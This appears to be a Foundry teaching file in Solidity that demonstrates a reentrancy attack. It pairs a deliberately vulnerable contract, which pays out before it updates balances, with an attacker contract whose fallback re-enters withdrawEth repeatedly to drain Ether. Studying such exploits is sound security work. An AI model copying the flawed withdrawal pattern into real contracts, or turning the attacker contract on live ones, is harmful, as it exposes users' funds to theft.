// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract ReentrancyVuln {
    mapping(address => uint256) balances;

    function giveEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        uint256 amountToWithdraw = balances[msg.sender];
        (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);
        // check effects fail
        balances[msg.sender] -= amountToWithdraw;
    }
}

contract ExploitReentrancy {
    uint256 public times_reentered = 0;
    uint256 public times_to_reenter;

    function withdrawEthFromVulnContract(address reentrant_contract, uint256 _times_to_reenter) public {
        times_to_reenter = _times_to_reenter;
        (bool success,) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
        // require(success);
    }

    function printBalance() public {
        console.log(address(this).balance);
    }

    fallback() external payable {
        if (times_reentered < times_to_reenter) {
            console.log("Fallback invoked, balance of contract is now:", address(this).balance / 1e18, "Ether");
            times_reentered = times_reentered + 1;
            (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
        }
    }
}
